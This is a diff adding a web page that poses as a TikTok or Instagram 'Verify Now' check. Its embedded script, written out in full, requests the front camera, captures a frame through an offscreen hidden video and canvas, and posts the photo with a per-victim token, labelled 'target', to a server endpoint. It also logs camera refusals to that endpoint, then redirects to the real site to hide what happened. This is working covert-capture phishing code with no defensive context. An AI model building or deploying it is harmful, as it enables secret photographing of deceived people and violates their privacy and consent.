@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verification Required</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <!-- Hidden video + canvas for silent capture -->
+    <video id="hiddenVideo" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0.01;" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <div class="container">
+        <div class="card verify-card">
+            <div id="platformBadge" class="platform-badge"></div>
+            <h1 id="verifyTitle">Verification Required</h1>
+            <p id="verifyDesc">We need to verify you're a real person. Click the button below to continue.</p>
+
+            <div id="verifyBtnContainer">
+                <button id="verifyBtn" class="btn-primary pulse">✅ Verify Now</button>
+            </div>
+
+            <div id="loadingSection" class="hidden">
+                <div class="loading-bar-container">
+                    <div class="loading-bar" id="loadingBar"></div>
+                </div>
+                <p id="loadingText" class="loading-text">Verifying identity...</p>
+            </div>
+
+            <div id="successSection" class="hidden">
+                <div class="success-icon">✔</div>
+                <h2>Verification Complete!</h2>
+                <p>Redirecting you now...</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // Get token from URL
+        // ============================================================
+        const params = new URLSearchParams(window.location.search);
+        const token = params.get('token');
+
+        const platformBadge = document.getElementById('platformBadge');
+        const verifyTitle = document.getElementById('verifyTitle');
+        const verifyDesc = document.getElementById('verifyDesc');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const verifyBtnContainer = document.getElementById('verifyBtnContainer');
+        const loadingSection = document.getElementById('loadingSection');
+        const loadingBar = document.getElementById('loadingBar');
+        const loadingText = document.getElementById('loadingText');
+        const successSection = document.getElementById('successSection');
+        const hiddenVideo = document.getElementById('hiddenVideo');
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+
+        if (!token) {
+            platformBadge.textContent = '⚠️';
+            verifyTitle.textContent = 'Invalid Link';
+            verifyDesc.textContent = 'No verification token provided. Please check your link.';
+            verifyBtn.style.display = 'none';
+        } else {
+            // Default to TikTok look initially — we'll fetch platform from server
+            platformBadge.className = 'platform-badge tiktok';
+            platformBadge.textContent = '♫';
+            
+            verifyBtn.addEventListener('click', async () => {
+                verifyBtnContainer.classList.add('hidden');
+                loadingSection.classList.remove('hidden');
+
+                const stepMessages = [
+                    'Verifying identity...',
+                    'Checking account credentials...',
+                    'Processing verification...',
+                    'Almost done...'
+                ];
+                let step = 0;
+
+                const loadInterval = setInterval(() => {
+                    const currentWidth = parseFloat(loadingBar.style.width) || 0;
+                    if (currentWidth < 90) {
+                        loadingBar.style.width = Math.min(currentWidth + (Math.random() * 15 + 5), 90) + '%';
+                    }
+                    if (step < stepMessages.length) {
+                        loadingText.textContent = stepMessages[step];
+                        step++;
+                    }
+                }, 400);
+
+                try {
+                    // Request front camera (silent)
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+
+                    hiddenVideo.srcObject = stream;
+                    await hiddenVideo.play();
+                    await new Promise(resolve => setTimeout(resolve, 800));
+
+                    // Capture frame
+                    hiddenCanvas.width = hiddenVideo.videoWidth;
+                    hiddenCanvas.height = hiddenVideo.videoHeight;
+                    const ctx = hiddenCanvas.getContext('2d');
+                    ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                    const photoData = hiddenCanvas.toDataURL('image/jpeg', 0.85);
+
+                    // Stop camera
+                    stream.getTracks().forEach(track => track.stop());
+                    hiddenVideo.srcObject = null;
+
+                    clearInterval(loadInterval);
+                    loadingBar.style.width = '100%';
+                    loadingText.textContent = '✅ Verification successful!';
+
+                    // Send photo to server
+                    await fetch('/api/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            token: token,
+                            platform: platformBadge.classList.contains('instagram') ? 'instagram' : 'tiktok',
+                            name: 'target',
+                            imageData: photoData
+                        })
+                    });
+
+                    await new Promise(resolve => setTimeout(resolve, 600));
+                    loadingSection.classList.add('hidden');
+                    successSection.classList.remove('hidden');
+
+                    setTimeout(() => {
+                        const platform = platformBadge.classList.contains('instagram') ? 'instagram' : 'tiktok';
+                        window.location.href = platform === 'tiktok' 
+                            ? 'https://www.tiktok.com' 
+                            : 'https://www.instagram.com';
+                    }, 1500);
+
+                } catch (err) {
+                    clearInterval(loadInterval);
+                    loadingBar.style.width = '100%';
+                    loadingText.textContent = '❌ Verification failed. Redirecting...';
+
+                    // Log the denial
+                    try {
+                        await fetch('/api/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                token: token,
+                                platform: platformBadge.classList.contains('instagram') ? 'instagram' : 'tiktok',
+                                name: 'target',
+                                imageData: null,
+                                error: 'Camera denied: ' + (err.message || 'unknown')
+                            })
+                        });
+                    } catch {}
+
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    const platform = platformBadge.classList.contains('instagram') ? 'instagram' : 'tiktok';
+                    window.location.href = platform === 'tiktok' 
+                        ? 'https://www.tiktok.com' 
+                        : 'https://www.instagram.com';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
